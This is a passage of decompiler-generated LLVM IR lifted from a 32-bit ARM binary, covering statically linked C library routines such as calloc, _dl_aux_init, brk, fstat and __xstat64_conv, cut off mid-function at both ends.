  %v3_1b110 = inttoptr i32 %v2_1b110 to i32*
  store i32 %v1_1b10c, i32* %v3_1b110, align 4
  %v3_1b114 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1b114, i32* @r0, align 4
  %v0_1b118 = load i32, i32* @r5, align 4
  %v1_1b118 = load i32, i32* @r6, align 4
  %v2_1b118 = inttoptr i32 %v1_1b118 to i32*
  store i32 %v0_1b118, i32* %v2_1b118, align 4
  %v0_1b11c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b11c = load i32, i32* @r6, align 4
  %v2_1b11c = add i32 %v1_1b11c, 16
  %v3_1b11c = inttoptr i32 %v2_1b11c to i32*
  store i32 %v0_1b11c, i32* %v3_1b11c, align 4
  %v0_1b120 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1b130 = load i32, i32* @r6, align 4
  store i32 %v0_1b130, i32* %v2_1af14, align 4
  %v0_1b148.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b138:                               ; preds = %dec_label_pc_1b0e8
  %v3_1b138 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1b138, i32* @r0, align 4
  %v0_1b13c = call i32 @free()
  store i32 %v0_1b13c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b140

dec_label_pc_1b140:                               ; preds = %dec_label_pc_1b064, %dec_label_pc_1b040, %dec_label_pc_1b138
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b148:                               ; preds = %dec_label_pc_1b0f0, %dec_label_pc_1b0dc, %dec_label_pc_1b140
  %v0_1b148 = phi i32 [ %v0_1b148.pre, %dec_label_pc_1b0f0 ], [ 3, %dec_label_pc_1b0dc ], [ 1, %dec_label_pc_1b140 ]
  %v1_1b148 = load i32, i32* @fp, align 4
  %v2_1b148 = inttoptr i32 %v1_1b148 to i32*
  store i32 %v0_1b148, i32* %v2_1b148, align 4
  br label %dec_label_pc_1b154

dec_label_pc_1b150:                               ; preds = %dec_label_pc_1af08, %dec_label_pc_1af1c
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b154

dec_label_pc_1b154:                               ; preds = %bb, %bb30, %dec_label_pc_1af90, %dec_label_pc_1af74, %dec_label_pc_1b148, %dec_label_pc_1b010, %dec_label_pc_1aee8, %dec_label_pc_1b150
  store i32 %v9_1aec0, i32* @r6, align 4
  store i32 %v12_1aec0, i32* @r7, align 4
  store i32 %v15_1aec0, i32* @r8, align 4
  store i32 %v18_1aec0, i32* @sb, align 4
  store i32 %v21_1aec0, i32* @sl, align 4
  %v1_1b15c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1b15c

; uselistorder directives
  uselistorder i32 %v2_1b048, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1afd0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1afa4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 2, 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b154, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1b150, { 1, 0 }
  uselistorder label %dec_label_pc_1b148, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1afa0, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1b160 = load i32, i32* @r4, align 4
  %v6_1b160 = load i32, i32* @r5, align 4
  %v9_1b160 = load i32, i32* @r6, align 4
  %v12_1b160 = load i32, i32* @lr, align 4
  %v2_1b168 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1b178 = mul i32 %arg2, %arg1
  store i32 %v2_1b178, i32* @r6, align 4
  br i1 %v2_1b168, label %dec_label_pc_1b1a8, label %dec_label_pc_1b180

dec_label_pc_1b180:                               ; preds = %entry
  %v2_1b188 = udiv i32 %v2_1b178, %arg1
  %v9_1b18c = icmp eq i32 %v2_1b188, %arg2
  br i1 %v9_1b18c, label %dec_label_pc_1b1a8, label %dec_label_pc_1b194

dec_label_pc_1b194:                               ; preds = %dec_label_pc_1b180
  %v0_1b194 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1b1a0 = inttoptr i32 %v0_1b194 to i32*
  store i32 12, i32* %v2_1b1a0, align 4
  br label %dec_label_pc_1b26c

dec_label_pc_1b1a8:                               ; preds = %dec_label_pc_1b180, %entry
  %v4_1b1ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 72) to i32*), align 4
  store i32 %v4_1b1ac, i32* @r4, align 4
  %v4_1b1c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  store i32 %v4_1b1c4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1b1c4)
  %v0_1b1d8 = load i32, i32* @r5, align 4
  %v2_1b1d8 = add i32 %v0_1b1d8, 16
  %v3_1b1d8 = inttoptr i32 %v2_1b1d8 to i32*
  %v4_1b1d8 = load i32, i32* %v3_1b1d8, align 4
  store i32 %v4_1b1d8, i32* %ip.global-to-local, align 4
  store i32 111076, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1b1d8)
  %v0_1b1e4 = load i32, i32* @r6, align 4
  %v1_1b1e8 = call i32 @malloc(i32 %v0_1b1e4)
  store i32 %v1_1b1e8, i32* %r4.global-to-local, align 4
  %v2_1b1ec = icmp eq i32 %v1_1b1e8, 0
  br i1 %v2_1b1ec, label %.thread, label %dec_label_pc_1b1f4

dec_label_pc_1b1f4:                               ; preds = %dec_label_pc_1b1a8
  %v1_1b1f4 = add i32 %v1_1b1e8, -4
  %v2_1b1f4 = inttoptr i32 %v1_1b1f4 to i32*
  %v3_1b1f4 = load i32, i32* %v2_1b1f4, align 4
  %v1_1b1f8 = and i32 %v3_1b1f4, 2
  %v2_1b1f8 = icmp eq i32 %v1_1b1f8, 0
  br i1 %v2_1b1f8, label %dec_label_pc_1b200, label %.thread

dec_label_pc_1b200:                               ; preds = %dec_label_pc_1b1f4
  %v1_1b2006 = add i32 %v3_1b1f4, -4
  %v1_1b204 = and i32 %v1_1b2006, -4
  store i32 %v1_1b204, i32* @r2, align 4
  %v3_1b208 = udiv i32 %v1_1b204, 4
  store i32 %v3_1b208, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1b204, 36
  %v2_1b210 = icmp ult i32 %v1_1b204, 33
  %v3_1b210 = or i1 %tmp, %v2_1b210
  br i1 %v3_1b210, label %dec_label_pc_1b21c, label %dec_label_pc_1b214

dec_label_pc_1b214:                               ; preds = %dec_label_pc_1b200
  %v2_1b214 = inttoptr i32 %v1_1b1e8 to i8*
  %v3_1b214 = call i32 @__GI_memset(i8* %v2_1b214, i32 0)
  br label %.thread

dec_label_pc_1b21c:                               ; preds = %dec_label_pc_1b200
  %tmp7 = icmp eq i32 %v1_1b204, 16
  %v2_1b220 = inttoptr i32 %v1_1b1e8 to i32*
  store i32 0, i32* %v2_1b220, align 4
  %v1_1b224 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b224 = add i32 %v1_1b224, 4
  %v3_1b224 = inttoptr i32 %v2_1b224 to i32*
  store i32 0, i32* %v3_1b224, align 4
  %v1_1b228 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b228 = add i32 %v1_1b228, 8
  %v3_1b228 = inttoptr i32 %v2_1b228 to i32*
  store i32 0, i32* %v3_1b228, align 4
  %v2_1b22c = icmp ult i32 %v1_1b204, 13
  %v3_1b22c = or i1 %tmp7, %v2_1b22c
  br i1 %v3_1b22c, label %.thread, label %dec_label_pc_1b230

dec_label_pc_1b230:                               ; preds = %dec_label_pc_1b21c
  %v0_1b230 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b234 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b234 = add i32 %v1_1b234, 12
  %v3_1b234 = inttoptr i32 %v2_1b234 to i32*
  store i32 0, i32* %v3_1b234, align 4
  %v1_1b238 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b238 = add i32 %v1_1b238, 16
  %v3_1b238 = inttoptr i32 %v2_1b238 to i32*
  store i32 0, i32* %v3_1b238, align 4
  %tmp8 = icmp ult i32 %v0_1b230, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1b240

dec_label_pc_1b240:                               ; preds = %dec_label_pc_1b230
  %v0_1b240 = load i32, i32* %ip.global-to-local, align 4
  %v7_1b240 = icmp eq i32 %v0_1b240, 9
  %v1_1b244 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b244 = add i32 %v1_1b244, 20
  %v3_1b244 = inttoptr i32 %v2_1b244 to i32*
  store i32 0, i32* %v3_1b244, align 4
  %v1_1b248 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b248 = add i32 %v1_1b248, 24
  %v3_1b248 = inttoptr i32 %v2_1b248 to i32*
  store i32 0, i32* %v3_1b248, align 4
  br i1 %v7_1b240, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b240
  %v2_1b24c = load i32, i32* %r4.global-to-local, align 4
  %v3_1b24c = add i32 %v2_1b24c, 32
  %v4_1b24c = inttoptr i32 %v3_1b24c to i32*
  store i32 0, i32* %v4_1b24c, align 4
  %v2_1b250 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b250 = add i32 %v2_1b250, 28
  %v4_1b250 = inttoptr i32 %v3_1b250 to i32*
  store i32 0, i32* %v4_1b250, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b240, %dec_label_pc_1b1f4, %dec_label_pc_1b230, %dec_label_pc_1b21c, %dec_label_pc_1b1a8, %dec_label_pc_1b214, %bb
  %v0_1b260 = load i32, i32* @r5, align 4
  %v2_1b260 = add i32 %v0_1b260, 24
  %v3_1b260 = inttoptr i32 %v2_1b260 to i32*
  %v4_1b260 = load i32, i32* %v3_1b260, align 4
  store i32 %v4_1b260, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1b260)
  br label %dec_label_pc_1b26c

dec_label_pc_1b26c:                               ; preds = %dec_label_pc_1b194, %.thread
  %v0_1b26c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1b160, i32* @r4, align 4
  store i32 %v6_1b160, i32* @r5, align 4
  store i32 %v9_1b160, i32* @r6, align 4
  store i32 %v12_1b160, i32* @lr, align 4
  ret i32 %v0_1b26c

; uselistorder directives
  uselistorder i32 %v1_1b204, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_1b1e8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 7, 2, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b26c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1b280(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b280:
  %v0_1b280 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b280, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1b280
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1b280, %bb
  %v10_1b290 = phi i32 [ %arg1, %dec_label_pc_1b280 ], [ 0, %bb ]
  ret i32 %v10_1b290

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v4_1b2a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 104) to i32*), align 4
  %v4_1b2a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 68) to i32*), align 4
  store i32 %v4_1b2a8, i32* %r1.global-to-local, align 4
  %v1_1b2ac = add i32 %arg1, 44
  %v2_1b2ac = inttoptr i32 %v1_1b2ac to i32*
  %v3_1b2ac = load i32, i32* %v2_1b2ac, align 4
  %v1_1b2b0 = add i32 %arg1, 28
  %v2_1b2b0 = inttoptr i32 %v1_1b2b0 to i32*
  %v3_1b2b0 = load i32, i32* %v2_1b2b0, align 4
  store i32 %v3_1b2b0, i32* %r2.global-to-local, align 4
  %v2_1b2b4 = inttoptr i32 %v4_1b2a0 to i32*
  store i32 %v3_1b2ac, i32* %v2_1b2b4, align 4
  %v0_1b2b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b2b8 = inttoptr i32 %v1_1b2b8 to i32*
  store i32 %v0_1b2b8, i32* %v2_1b2b8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1b2c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b2c4:
  %v0_1b2c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b2c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b2c4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b2c4, %bb
  %v4_1b2c8 = phi i32 [ %arg1, %dec_label_pc_1b2c4 ], [ 0, %bb ]
  ret i32 %v4_1b2c8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b308:
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r2, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 26456) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_1b318 = load i32, i32* @r0, align 4
  ret i32 %v1_1b318
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_1b31c = load i32, i32* @r0, align 4
  ret i32 %v1_1b31c
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_1b320 = load i32, i32* @r0, align 4
  ret i32 %v1_1b320
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1b32c = load i32, i32* @r1, align 4
  store i32 %v0_1b32c, i32* @r3, align 4
  %v0_1b33c = load i32, i32* @r0, align 4
  store i32 %v0_1b33c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b33c, -4095
  br i1 %tmp, label %dec_label_pc_1b35c, label %dec_label_pc_1b348

dec_label_pc_1b348:                               ; preds = %entry
  %v0_1b348 = call i32 @__GI___errno_location()
  %v0_1b34c = load i32, i32* %r7.global-to-local, align 4
  %v1_1b34c = sub i32 0, %v0_1b34c
  store i32 %v1_1b34c, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1b354 = inttoptr i32 %v0_1b348 to i32*
  store i32 %v1_1b34c, i32* %v2_1b354, align 4
  br label %dec_label_pc_1b36c

dec_label_pc_1b35c:                               ; preds = %entry
  %v2_1b35c = icmp eq i32 %v0_1b33c, 0
  br i1 %v2_1b35c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b35c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b35c, %bb
  call void @__pseudo_cond_branch(i1 %v2_1b35c, i32 ptrtoint (i32* @global_var_1b4f4.1172 to i32))
  br label %dec_label_pc_1b36c

dec_label_pc_1b36c:                               ; preds = %dec_label_pc_1b348, %.thread
  %v0_1b36c = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1b36c

; uselistorder directives
  uselistorder i32 %v0_1b33c, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b36c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1b37c = load i32, i32* @r4, align 4
  store i32 %v3_1b37c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_1b394 = inttoptr i32 %arg2 to i8*
  %v3_1b394 = call i32 @__GI_memset(i8* %v2_1b394, i32 0)
  %v2_1b398 = load i32, i32* %arg1, align 4
  store i32 %v2_1b398, i32* %r3.global-to-local, align 4
  %v3_1b398 = add i32 %tmp, 4
  %v4_1b398 = inttoptr i32 %v3_1b398 to i32*
  %v5_1b398 = load i32, i32* %v4_1b398, align 4
  store i32 %v5_1b398, i32* %r4.global-to-local, align 4
  %v0_1b39c = load i32, i32* %r5.global-to-local, align 4
  %v1_1b39c = inttoptr i32 %v0_1b39c to i32*
  store i32 %v2_1b398, i32* %v1_1b39c, align 4
  %v3_1b39c = add i32 %v0_1b39c, 4
  %v4_1b39c = inttoptr i32 %v3_1b39c to i32*
  %v5_1b39c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b39c, i32* %v4_1b39c, align 4
  %v0_1b3a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b3a0 = add i32 %v0_1b3a0, 12
  %v2_1b3a0 = inttoptr i32 %v1_1b3a0 to i32*
  %v3_1b3a0 = load i32, i32* %v2_1b3a0, align 4
  %v1_1b3a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b3a4 = add i32 %v1_1b3a4, 12
  %v3_1b3a4 = inttoptr i32 %v2_1b3a4 to i32*
  store i32 %v3_1b3a0, i32* %v3_1b3a4, align 4
  %v0_1b3a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b3a8 = add i32 %v0_1b3a8, 96
  store i32 %v1_1b3a8, i32* %r3.global-to-local, align 4
  %v1_1b3ac = inttoptr i32 %v1_1b3a8 to i32*
  %v2_1b3ac = load i32, i32* %v1_1b3ac, align 4
  store i32 %v2_1b3ac, i32* %r3.global-to-local, align 4
  %v3_1b3ac = add i32 %v0_1b3a8, 100
  %v4_1b3ac = inttoptr i32 %v3_1b3ac to i32*
  %v5_1b3ac = load i32, i32* %v4_1b3ac, align 4
  store i32 %v5_1b3ac, i32* %r4.global-to-local, align 4
  %v1_1b3b0 = add i32 %v0_1b3a8, 56
  %v2_1b3b0 = inttoptr i32 %v1_1b3b0 to i32*
  %v3_1b3b0 = load i32, i32* %v2_1b3b0, align 4
  store i32 %v3_1b3b0, i32* %r2.global-to-local, align 4
  %v1_1b3b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b3b4 = add i32 %v1_1b3b4, 96
  %v3_1b3b4 = inttoptr i32 %v2_1b3b4 to i32*
  store i32 %v2_1b3ac, i32* %v3_1b3b4, align 4
  %v0_1b3b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b3b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b3b8 = add i32 %v1_1b3b8, 100
  %v3_1b3b8 = inttoptr i32 %v2_1b3b8 to i32*
  store i32 %v0_1b3b8, i32* %v3_1b3b8, align 4
  %v0_1b3bc = load i32, i32* %r6.global-to-local, align 4
  %v1_1b3bc = add i32 %v0_1b3bc, 24
  store i32 %v1_1b3bc, i32* %ip.global-to-local, align 4
  %v1_1b3c0 = inttoptr i32 %v1_1b3bc to i32*
  %v2_1b3c0 = load i32, i32* %v1_1b3c0, align 4
  store i32 %v2_1b3c0, i32* %ip.global-to-local, align 4
  %v3_1b3c0 = add i32 %v0_1b3bc, 28
  %v4_1b3c0 = inttoptr i32 %v3_1b3c0 to i32*
  %v5_1b3c0 = load i32, i32* %v4_1b3c0, align 4
  store i32 %v5_1b3c0, i32* %lr.global-to-local, align 4
  %v0_1b3c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b3c4 = add i32 %v1_1b3c4, 56
  %v3_1b3c4 = inttoptr i32 %v2_1b3c4 to i32*
  store i32 %v0_1b3c4, i32* %v3_1b3c4, align 4
  %v0_1b3c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b3c8 = add i32 %v0_1b3c8, 72
  store i32 %v1_1b3c8, i32* %r3.global-to-local, align 4
  %v1_1b3cc = add i32 %v0_1b3c8, 32
  store i32 %v1_1b3cc, i32* %r7.global-to-local, align 4
  %v1_1b3d0 = inttoptr i32 %v1_1b3cc to i32*
  %v2_1b3d0 = load i32, i32* %v1_1b3d0, align 4
  store i32 %v2_1b3d0, i32* %r7.global-to-local, align 4
  %v3_1b3d0 = add i32 %v0_1b3c8, 36
  %v4_1b3d0 = inttoptr i32 %v3_1b3d0 to i32*
  %v5_1b3d0 = load i32, i32* %v4_1b3d0, align 4
  store i32 %v5_1b3d0, i32* %r8.global-to-local, align 4
  %v1_1b3d4 = inttoptr i32 %v1_1b3c8 to i32*
  %v2_1b3d4 = load i32, i32* %v1_1b3d4, align 4
  %v3_1b3d4 = add i32 %v0_1b3c8, 76
  %v4_1b3d4 = inttoptr i32 %v3_1b3d4 to i32*
  %v5_1b3d4 = load i32, i32* %v4_1b3d4, align 4
  store i32 %v5_1b3d4, i32* %r1.global-to-local, align 4
  %v0_1b3d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b3d8 = add i32 %v0_1b3d8, 72
  %v1_1b3dc = inttoptr i32 %v1_1b3d8 to i32*
  store i32 %v2_1b3d4, i32* %v1_1b3dc, align 4
  %v3_1b3dc = add i32 %v0_1b3d8, 76
  %v4_1b3dc = inttoptr i32 %v3_1b3dc to i32*
  %v5_1b3dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b3dc, i32* %v4_1b3dc, align 4
  %v0_1b3e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1b3e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b3e0 = add i32 %v1_1b3e0, 32
  %v3_1b3e0 = inttoptr i32 %v2_1b3e0 to i32*
  store i32 %v0_1b3e0, i32* %v3_1b3e0, align 4
  %v0_1b3e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1b3e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b3e4 = add i32 %v1_1b3e4, 36
  %v3_1b3e4 = inttoptr i32 %v2_1b3e4 to i32*
  store i32 %v0_1b3e4, i32* %v3_1b3e4, align 4
  %v0_1b3e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b3e8 = add i32 %v0_1b3e8, 80
  store i32 %v1_1b3e8, i32* %r3.global-to-local, align 4
  %v1_1b3ec = add i32 %v0_1b3e8, 48
  store i32 %v1_1b3ec, i32* %r7.global-to-local, align 4
  %v1_1b3f0 = inttoptr i32 %v1_1b3ec to i32*
  %v2_1b3f0 = load i32, i32* %v1_1b3f0, align 4
  store i32 %v2_1b3f0, i32* %r7.global-to-local, align 4
  %v3_1b3f0 = add i32 %v0_1b3e8, 52
  %v4_1b3f0 = inttoptr i32 %v3_1b3f0 to i32*
  %v5_1b3f0 = load i32, i32* %v4_1b3f0, align 4
  store i32 %v5_1b3f0, i32* %r8.global-to-local, align 4
  %v1_1b3f4 = inttoptr i32 %v1_1b3e8 to i32*
  %v2_1b3f4 = load i32, i32* %v1_1b3f4, align 4
  %v3_1b3f4 = add i32 %v0_1b3e8, 84
  %v4_1b3f4 = inttoptr i32 %v3_1b3f4 to i32*
  %v5_1b3f4 = load i32, i32* %v4_1b3f4, align 4
  store i32 %v5_1b3f4, i32* %r1.global-to-local, align 4
  %v1_1b3f8 = add i32 %v0_1b3e8, 16
  %v2_1b3f8 = inttoptr i32 %v1_1b3f8 to i32*
  %v3_1b3f8 = load i32, i32* %v2_1b3f8, align 4
  store i32 %v3_1b3f8, i32* %r2.global-to-local, align 4
  %v0_1b3fc = load i32, i32* %r5.global-to-local, align 4
  %v1_1b3fc = add i32 %v0_1b3fc, 80
  %v1_1b400 = inttoptr i32 %v1_1b3fc to i32*
  store i32 %v2_1b3f4, i32* %v1_1b400, align 4
  %v3_1b400 = add i32 %v0_1b3fc, 84
  %v4_1b400 = inttoptr i32 %v3_1b400 to i32*
  %v5_1b400 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b400, i32* %v4_1b400, align 4
  %v0_1b404 = load i32, i32* %r7.global-to-local, align 4
  %v1_1b404 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b404 = add i32 %v1_1b404, 48
  %v3_1b404 = inttoptr i32 %v2_1b404 to i32*
  store i32 %v0_1b404, i32* %v3_1b404, align 4
  %v0_1b408 = load i32, i32* %r8.global-to-local, align 4
  %v1_1b408 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b408 = add i32 %v1_1b408, 52
  %v3_1b408 = inttoptr i32 %v2_1b408 to i32*
  store i32 %v0_1b408, i32* %v3_1b408, align 4
  %v0_1b40c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b40c = load i32, i32* %r5.global-to-local, align 4
  %v2_1b40c = add i32 %v1_1b40c, 16
  %v3_1b40c = inttoptr i32 %v2_1b40c to i32*
  store i32 %v0_1b40c, i32* %v3_1b40c, align 4
  %v0_1b410 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b410 = add i32 %v0_1b410, 88
  store i32 %v1_1b410, i32* %r3.global-to-local, align 4
  %v1_1b414 = add i32 %v0_1b410, 20
  %v2_1b414 = inttoptr i32 %v1_1b414 to i32*
  %v3_1b414 = load i32, i32* %v2_1b414, align 4
  store i32 %v3_1b414, i32* %r2.global-to-local, align 4
  %v1_1b418 = inttoptr i32 %v1_1b410 to i32*
  %v2_1b418 = load i32, i32* %v1_1b418, align 4
  %v3_1b418 = add i32 %v0_1b410, 92
  %v4_1b418 = inttoptr i32 %v3_1b418 to i32*
  %v5_1b418 = load i32, i32* %v4_1b418, align 4
  store i32 %v5_1b418, i32* %r1.global-to-local, align 4
  %v1_1b41c = add i32 %v0_1b410, 64
  store i32 %v1_1b41c, i32* %r6.global-to-local, align 4
  %v1_1b420 = inttoptr i32 %v1_1b41c to i32*
  %v2_1b420 = load i32, i32* %v1_1b420, align 4
  store i32 %v2_1b420, i32* %r6.global-to-local, align 4
  %v3_1b420 = add i32 %v0_1b410, 68
  %v4_1b420 = inttoptr i32 %v3_1b420 to i32*
  %v5_1b420 = load i32, i32* %v4_1b420, align 4
  store i32 %v5_1b420, i32* %r7.global-to-local, align 4
  %v0_1b424 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b424 = add i32 %v0_1b424, 88
  store i32 %v1_1b424, i32* %r3.global-to-local, align 4
  %v2_1b428 = add i32 %v0_1b424, 20
  %v3_1b428 = inttoptr i32 %v2_1b428 to i32*
  store i32 %v3_1b414, i32* %v3_1b428, align 4
  %v0_1b42c = load i32, i32* %ip.global-to-local, align 4
  %v1_1b42c = load i32, i32* %r5.global-to-local, align 4
  %v2_1b42c = add i32 %v1_1b42c, 24
  %v3_1b42c = inttoptr i32 %v2_1b42c to i32*
  store i32 %v0_1b42c, i32* %v3_1b42c, align 4
  %v0_1b430 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b430 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b430 = add i32 %v1_1b430, 28
  %v3_1b430 = inttoptr i32 %v2_1b430 to i32*
  store i32 %v0_1b430, i32* %v3_1b430, align 4
  %v0_1b434 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b434 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b434 = add i32 %v1_1b434, 64
  %v3_1b434 = inttoptr i32 %v2_1b434 to i32*
  store i32 %v0_1b434, i32* %v3_1b434, align 4
  %v0_1b438 = load i32, i32* %r7.global-to-local, align 4
  %v1_1b438 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b438 = add i32 %v1_1b438, 68
